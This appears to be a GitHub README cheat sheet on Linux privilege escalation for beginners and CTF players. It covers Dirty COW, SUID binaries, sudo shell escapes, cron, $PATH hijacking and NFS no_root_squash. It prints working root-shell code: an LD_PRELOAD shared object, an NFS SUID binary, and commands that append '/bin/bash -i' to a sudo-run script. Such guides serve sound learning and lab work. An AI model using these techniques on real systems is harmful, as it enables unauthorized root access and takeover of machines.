<h1 align="center">
  Privilege-Escalation-For-Linux
</h1>
<h3 align="center">To bypass security restrictions in misconfigured systems for beginners.</h4>


---




## List of Automated Eumeration Tools 👇🏻

  - LinPeas - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - LinEnum - https://github.com/rebootuser/LinEnum
  - LES - https://github.com/mzet-/linux-exploit-suggester
  - Linux Smart Enumeration - https://github.com/diego-treitos/linux-smart-enumeration
  - Linux Priv Checker - https://github.com/linted/linuxprivchecker 

---

***⭐GTFOBins*** - https://gtfobins.github.io/ 

---
## Kernel Exploits
  - sometimes the Kernel may be vulnerable
  - To Check the version 
```
uname -a
cat /etc/issue
cat /proc/version
```
  - Now we have the information we can search for the vulnerabilities in [exploit-db](www.exploit-db.com) or on https://www.linuxkernelcves.com/cves
  - We can also use [Linux Priv Checker]( https://github.com/linted/linuxprivchecker ) as mentioned above.
  
    - ### Dirty Cow  

       - [CVE-2016-5195](https://www.linuxkernelcves.com/cves/CVE-2016-5195) This is one of the famous kernel exploits as it affected almost all of the linux based OS
       - List of PoCs - https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
       - By using this vulnerability we can write to a file which we have read-only permission
       - First of all we command the kernel to create a private mapping of ``root_file`` using ``mmap`` .
       - It is stored in physical memory. We can also specify the location in the physical memory by ``mmap()`` call
       - But the kernal do not do all these yet until we start wrting to our private mapping (COW - copy-on-write)
       - Now we write to ``proc/self/mem``.
       - It begins to write the  ``root_file``.
       - Now, the kernel also need to create a private copy so it does.
       - In between these these steps "Locating physical address" and "writing to that address". We can get in the middle of the two steps and run some other/malicious code 
       - This is how we tricked the kernel to write to a file which was only having read-only-access
       - we can use [dirtyc0w.c](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c) for PoC
       - > For visualization -  https://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/dirty-cow/demo.html
---


## Exploitiing all the Binaries which have SUID and SGID bits set
  -To list all the binaries which have SUID and SGID buts set
  
```
find / -type f -perm -04000 -ls 2>/dev/null
```
  - after listing all the binaries check the exploits in [GTFOBins](https://gtfobins.github.io/) 

---

## Using LD_Preload
  - You can check if LD_Preload environment option is there or not by 
 ```
 sudo -l
 ```
  - If you can see this 👉`env_keep+=LD_Preload` then the function is enabled.
  - This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
  - Compile it using GCC into a Shared Object file(.so)
```
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```
  - Run it by using LD_Preload option  
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
> This is also explained in this blog - https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

---

## Exploting Sudo Rights
  - To list the executable Binaries/files 👉🏿 `sudo -l`

![sudo -l](https://user-images.githubusercontent.com/85082756/149580032-d68641ca-96e2-4538-8032-7149d6c71111.png)

  - Now when we have the list of programs then we can search the following command in the [GFTObins](https://gtfobins.github.io/#+sudo)
    - for above we can use the less binary for gaing root access with the following command 👇
    - ```
      sudo less /etc/profile
      !/bin/sh
      ```
  - If you got any file like **exec.sh** then we can edit the contents inside it and we can execute it
```
echo "/bin/bash -i" >> exec.sh
```
```
sudo ./exec.sh
```
  > Check the following articles 👇

 - https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/
 - https://steflan-security.com/linux-privilege-escalation-vulnerable-sudo-version/
 - **Abusing 'find', 'vim' and 'awk' for root access** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
---


## Through Capabilities
  - List all enabled Capabilities
```
getcap -r / 2>/dev/null
```
  - If you find any set capabilities then use GTFOBins and search your Binary name - https://gtfobins.github.io/#+capabilities

---

## Cron job configurations
  - Anyone can read the file cron jobs under 👇🏻
```
/etc/crontab
```
![crontab](https://user-images.githubusercontent.com/85082756/149584453-8eb5218b-749f-4eb2-8a52-3095c487a39e.png)

  - If you find any jobs then u can edit that file to gain the root access MAKE SURE THEY ARE UNDER `root`
    - or created one on the same directory if not present or deleted
  - You can use the reverse shell to get the access CHECK THE JOB RUN TIME
    - in most of the CTFs they run every minute or 5 so
  
---

## Using $PATH
  - list the PATH by ``echo $PATH``
  
  - Check if the current folder in $PATH is writable 👇
  
  - find for writable path ``find / -writable 2>/dev/null`` or clean the out put using -> `` find / -writable 2>/dev/null | cut -d "/" -f2 | sort -u ``
![writable](https://user-images.githubusercontent.com/85082756/149846878-6f3c25b7-c37e-4756-8910-5e39640ce52d.png)



  - To find the folder under the writable path use ``find / -writable 2>/dev/null | grep {DIR} | cut -d "/" -f 2,3,4 | sort -u`` (change the {DIR})

  - Check if the current user can modify the path
  
  - If you can then add the following folder in $PATH which is writable in most of the cases it is ``/tmp``

  - If able to modify the $PATH then ``export PATH=/{DIR}:$PATH`` (make sure to change the {DIR})

  - Now we have the required directory listed in out $PATH then we can just create a Script to exploit it 

  - Go to any writable folder and make a script using nano

  - script  example 👉🏻 [path.c](path.c).
  - Now compile it using gcc ``gcc path.c -o shell``. 

  - OR you can also use python3 file [path.py](path.py), just run it as executable`./{filename}` ❌ not as `python3 {file.py}` ❌

  - After compiling set the SUID bit ``chmod u+s shell``

  - Now, go into the directory whichever you have added to $PATH and create a executable file ``echo "/bin/bash" > tobeX ``
  give it executable rights ``chmod 777 tobeX ``

  - Final Step ->  Just run script that we have created  ``./shell``. Boom!

> [Becoming Root Via a Misconfigured PATH](https://betterprogramming.pub/becoming-root-via-a-misconfigured-path-720a52981c93)

---

## Network File Share
  - The list of all the fielsystems which may be exported is present in `/etc/exports`.


  - Check for `no_root_squash`.

  - By using `showmount` you can see the mountable shares in your attack machine. 


  - Then just mount the shared to your attack machine by 👉🏻 `mount -o rw {ip of target}:{mountable dir} /{dir of ur attack machine}`


  - Just create a executable with SUID bit set in that folder which can run /bin/bash on the target system check this [nfs.c](nfs.c) for example 
```
int main()
{setgid(0);
 setuid(0);
 system("/bin/bash");
 return 0;
}
```

  - Just compile it and run it from the target system.
